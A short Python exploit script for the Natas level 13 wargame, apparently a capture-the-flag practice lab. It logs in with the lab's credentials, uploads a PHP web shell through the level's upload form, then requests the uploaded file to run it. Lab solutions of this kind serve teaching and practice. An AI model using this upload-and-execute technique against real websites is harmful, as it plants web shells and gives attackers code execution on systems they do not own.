# exploit.

import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

url = 'http://natas13.natas.labs.overthewire.org/'
auth_data = HTTPBasicAuth('natas13', 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY')
r = requests.post(url, files = { "uploadedfile" : open('shell13.php', 'rb')}, 
                       data = { "filename": "shell13.php", "MAX_FILE_SIZE" : "1000"}, 
                       auth = auth_data)
print(r.text)

soup = BeautifulSoup(r.content, 'html.parser')
html_string = soup.prettify().replace('<br/>', '')
href_link_list = []
for link in soup.findAll("a"):
    href_link_list.append(link.get("href"))

# We check at this point in which index of the list our .php link located.
# In our case it's located in the exact first position (index = 0).
url += href_link_list[0]

print("[*] Exploit link: ")
print(url)
print("[*] Making a request ...")

r = requests.post(url, auth = auth_data)
print("[*] Response: \n" + str(r.text))

